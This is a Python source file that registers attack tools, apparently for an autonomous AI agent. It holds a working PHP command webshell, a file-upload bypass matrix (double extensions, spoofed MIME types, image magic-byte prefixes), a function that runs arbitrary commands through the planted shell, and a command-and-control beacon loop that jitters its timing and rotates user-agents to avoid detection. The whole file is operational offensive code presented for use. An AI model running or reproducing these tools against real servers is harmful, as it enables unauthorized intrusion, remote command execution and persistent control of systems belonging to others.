"""TOOL: upload_shell - file upload bypass matrix -> webshell deployment -> C2 loop.

Stage 1 (upload_webshell): fire the classic bypass matrix (extensions, MIME,
magic bytes, double-extension, .htaccess poison), verify each candidate URL by
marker command. Stage 2 (shell_session): poll the confirmed shell with new
commands — a stateless C2 the agent can chain round after round.
"""
import json, os, time
from tools import register
from tools._exploit_lib import (marker, paced_send, verdict, multipart_body,
                                extract_between, apply_template)

SHELL_PHP = '<?php echo "VFS@@"; if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } echo "@@E"; ?>'

CANDIDATES = [
    # (filename, content_prefix, mime, shell_query_param)
    ("shell.php",      "",            "application/x-php",      "cmd"),
    ("shell.php5",     "",            "application/x-php",      "cmd"),
    ("shell.phtml",    "",            "application/x-php",      "cmd"),
    ("shell.phar",     "",            "application/x-php",      "cmd"),
    ("shell.pHp",      "",            "image/jpeg",             "cmd"),
    ("shell.php.jpg",  "",            "image/jpeg",             "cmd"),
    ("shell.jpg.php",  "",            "image/jpeg",             "cmd"),
    ("shell.jpg",      "GIF89a",      "image/gif",              "cmd"),
    ("shell.png",      "\x89PNG\r\n\x1a\n", "image/png",        "cmd"),
    ("shell.asp",      "<% Response.Write(\"VFS@@\") %>", "application/x-asp", ""),
]

@register(name="upload_webshell",
          desc="EXPLOIT: file upload bypass matrix -> deploy webshell -> verify with marker command. Returns working shell URL for shell_session.",
          params={"type": "object", "properties": {
              "upload_url": {"type": "string", "description": "multipart upload endpoint"},
              "file_field": {"type": "string", "default": "file"},
              "base_uploads_url": {"type": "string", "description": "where uploaded files are served, e.g. https://x/uploads/"},
              "extra_fields": {"type": "object", "description": "other form fields (csrf etc.)"},
              "shell_source": {"type": "string", "description": "custom shell code; default is a tiny PHP cmd shell"},
              "candidates": {"type": "array", "items": {"type": "string"}, "description": "restrict to these filenames"}},
              "required": ["upload_url", "base_uploads_url"]},
          danger="loud")
def upload_webshell(upload_url, file_field="file", base_uploads_url=None,
                    extra_fields=None, shell_source=None, candidates=None):
    base_uploads_url = (base_uploads_url or "").rstrip("/") + "/"
    shell_src = shell_source or SHELL_PHP
    m1, m2 = marker("VFS"), marker("VFS")
    # inject marker pair around command output check
    check_cmd = f"echo {m1}; id; echo {m2}"

    attempts, working = [], None
    for fname, prefix, mime, qparam in CANDIDATES:
        if candidates and fname not in candidates:
            continue
        # magic-byte prefix (GIF89a/PNG header) rides in front of the script —
        # content-inspection gatekeepers see an image, the parser still runs it
        content = (prefix + shell_src) if prefix else shell_src
        body, ctype = multipart_body(extra_fields or {}, file_field, fname,
                                     content, mime)
        st, resp, dt = paced_send(upload_url, method="POST",
                                  headers={"Content-Type": ctype},
                                  body=body, timeout=25)
        entry = {"filename": fname, "status": st, "resp_sample": (resp or "")[:150]}
        # try to serve it
        if qparam:
            from urllib.parse import quote
            shell_url = f"{base_uploads_url}{fname}?{qparam}={quote(check_cmd, safe='')}"
        else:
            shell_url = f"{base_uploads_url}{fname}"
        gst, gbody, _gdt = paced_send(shell_url, timeout=15)
        entry["served_status"] = gst
        # Z4.2: marker PAIR proves execution — a page merely containing
        # static shell text (false mirror) has m1 but never m2 around
        # live output. Both must appear, or uid= as the id fallback.
        if m1 in (gbody or "") and (m2 in (gbody or "") or "uid=" in (gbody or "")):
            out = extract_between(gbody or "", m1, m2) or (gbody or "")[:300]
            entry["shell_url"] = shell_url
            entry["output"] = out[:400]
            attempts.append(entry)
            working = {"filename": fname, "shell_url": shell_url,
                       "output": out[:600], "param": qparam}
            break
        attempts.append(entry)

    return verdict("upload_webshell", bool(working),
                   (f"WEBSHELL LIVE: {working['shell_url']}" if working
                    else "no bypass landed — server sanitizes uploads or shell not parsed"),
                   evidence=[json.dumps(a)[:300] for a in attempts[:10]],
                   attempts=attempts, shell=working)


@register(name="shell_session",
          desc="EXPLOIT: interact with a deployed webshell — send one command (or a short batch) through a confirmed shell URL. Stateless C2 round.",
          params={"type": "object", "properties": {
              "shell_url": {"type": "string", "description": "confirmed shell URL; {CMD} optional placeholder, else ?cmd="},
              "commands": {"type": "array", "items": {"type": "string"}, "default": ["id", "pwd"]},
              "param": {"type": "string", "default": "cmd"}},
              "required": ["shell_url"]},
          danger="loud")
def shell_session(shell_url, commands=None, param="cmd"):
    commands = commands or ["id", "pwd"]
    results = []
    for cmd in commands[:6]:
        m1, m2 = marker("VFS"), marker("VFS")
        wrapped = f"echo {m1}; {cmd}; echo {m2}"
        if "{CMD}" in shell_url:
            url = apply_template(shell_url, wrapped, "{CMD}", quote_all=True)
        else:
            from urllib.parse import quote
            url = shell_url + ("&" if "?" in shell_url else "?") + f"{param}={quote(wrapped, safe='')}"
        st, body, dt = paced_send(url, timeout=20)
        out = extract_between(body or "", m1, m2)
        results.append({"cmd": cmd, "status": st, "output": (out or "")[:800],
                        "ok": out is not None})
    alive = any(r["ok"] for r in results)
    return verdict("shell_session", alive,
                   (f"shell alive — {sum(r['ok'] for r in results)}/{len(results)} commands returned output"
                    if alive else "shell dead or output channel blocked"),
                   evidence=[f"{r['cmd']} -> {r['output'][:120]}" for r in results if r["ok"]],
                   results=results)


_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
]


@register(name="c2_pulse",
          desc="C2: beacon discipline for a deployed shell — N heartbeats with ±jitter on the sleep, rotating UA fingerprints, exponential backoff on 5xx, session id. Measures shell liveness the way real C2 keeps beacons breathing.",
          params={"type": "object", "properties": {
              "shell_url": {"description": "confirmed webshell URL; {CMD} optional, else ?cmd=", "type": "string"},
              "rounds": {"description": "heartbeat count", "type": "number"},
              "sleep_s": {"description": "base sleep between heartbeats (jittered ±40%)", "type": "number"},
              "param": {"description": "command parameter name", "type": "string"},
              "session": {"description": "session id (auto-generated when omitted)", "type": "string"}},
              "required": ["shell_url"]},
          danger="loud")
def c2_pulse(shell_url, rounds=6, sleep_s=2.0, param="cmd", session=None):
    import random as _r
    from urllib.parse import quote
    from tools._exploit_lib import paced_send
    session = session or f"S{os.urandom(3).hex().upper()}"
    rounds = max(2, min(20, int(rounds)))
    sleep_s = max(0.5, min(30.0, float(sleep_s)))
    beats = []
    backoff = 1.0
    for i in range(rounds):
        jitter = sleep_s * _r.uniform(0.6, 1.4)
        time.sleep(jitter)
        ua = _r.choice(_UAS)
        m1, m2 = marker("VFB"), marker("VFB")
        wrapped = f"echo {m1}; id; echo {m2}"
        if "{CMD}" in shell_url:
            url = apply_template(shell_url, wrapped, "{CMD}", quote_all=True)
        else:
            url = shell_url + ("&" if "?" in shell_url else "?") + \
                f"{param}={quote(wrapped, safe='')}&s={session}"
        st, body, dt = paced_send(url, headers={"User-Agent": ua}, timeout=15)
        out = extract_between(body or "", m1, m2)
        ok = out is not None
        beat = {"beat": i + 1, "status": st, "alive": ok, "rtt": dt,
                "sleep": round(jitter, 2), "ua": ua.split(" ")[2][:14], "session": session}
        beats.append(beat)
        # exponential backoff on failures — real beacons back away, they don't hammer
        backoff = backoff * 2 if (st >= 500 or st == 0) else 1.0
        if backoff > 1.0:
            time.sleep(min(backoff, 8.0))

    alive_n = sum(b["alive"] for b in beats)
    rtt_mean = round(sum(b["rtt"] for b in beats) / len(beats), 2)
    live_pct = round(100 * alive_n / len(beats))
    exploitable = live_pct >= 50
    return verdict("c2_pulse", exploitable,
                   (f"beacon alive {live_pct}% ({alive_n}/{len(beats)} beats, mean RTT {rtt_mean}s, "
                    f"session {session}) — shell is a sustainable C2 channel"
                    if exploitable else
                    f"beacon weak ({alive_n}/{len(beats)} beats) — shell unreliable as C2"),
                   evidence=beats[:6], live_pct=live_pct, session=session, rtt_mean=rtt_mean)
